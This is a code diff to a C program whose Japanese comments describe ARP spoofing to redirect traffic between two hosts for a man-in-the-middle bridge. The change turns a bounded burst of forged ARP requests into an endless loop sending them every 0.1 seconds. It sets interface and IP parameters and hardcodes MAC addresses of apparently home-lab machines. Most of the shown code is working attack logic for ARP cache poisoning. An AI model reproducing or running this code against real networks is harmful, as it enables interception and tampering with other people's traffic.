@@ -13,6 +13,7 @@
 #include    <netinet/ip.h>
 #include	"netutil.h"
 
+#include <unistd.h>
 
 
 typedef struct	{
@@ -24,7 +25,7 @@ typedef struct	{
     char    *ip_B;
 }PARAM;
 //ここは手動で変える必要がある！
-PARAM	Param={"enp4s0","lo",1, "192.168.1.4", "192.168.1.110"};
+PARAM	Param={"enp0s3","lo",1, "192.168.1.99", "192.168.1.110"};
 
 typedef struct    {
     int    soc;
@@ -477,19 +478,19 @@ int main(int argc,char *argv[],char *envp[])
     //SendArpRequestB(Device[0].soc, recIp.s_addr, bcast, Device[0].addr.s_addr, Device[0].hwaddr);
     //sendIp→recIpの通信をこちらに回すARPスプーフィング。相手のIPアドレスに、こちらは端末BのIPアドレス、かつ自分のMACアドレスを入れてリクエストを送る
     int     i=0;
-    for(i=0; i<100; i++){
+    while(1){
         SendArpRequestB(Device[0].soc, sendIp.s_addr, bcast, recIp.s_addr, Device[0].hwaddr);
+        usleep(0.1 * 1000000);
     }
     
     //TODO:あとでPARAMSに移動
-    //static  u_char    mac_A[6]={0x68,0x05,0xCA,0x06,0xF6,0x7B};   //端末AのMACアドレス(desk-h)
+    static  u_char    mac_A[6]={0x68,0x05,0xCA,0x06,0xF6,0x7B};   //端末AのMACアドレス(desk-h)
     static  u_char    mac_B[6]={0xB8,0x27,0xEB,0x4A,0xA3,0x53};   //端末BのMACアドレス(rasp-h)
-    //static  u_char    mac_B[6]={0x00,0x25,0x36,0xC3,0x74,0x16};  //router
-    static  u_char    mac_A[6]={0x08,0x00,0x27,0xCE,0xF8,0x80};  //MBP
+    //static  u_char    mac_B[6]={0x08,0x00,0x27,0xCE,0xF8,0x80};  //MBP
     
     //---ARPスプーフィングここまで
     //---ブリッジ
-    MITMBridge(sendIp.s_addr, mac_A, recIp.s_addr, mac_B);
+    //MITMBridge(sendIp.s_addr, mac_A, recIp.s_addr, mac_B);
     //Bridge();
     //---ブリッジここまで
     DebugPrintf("bridge end\n");
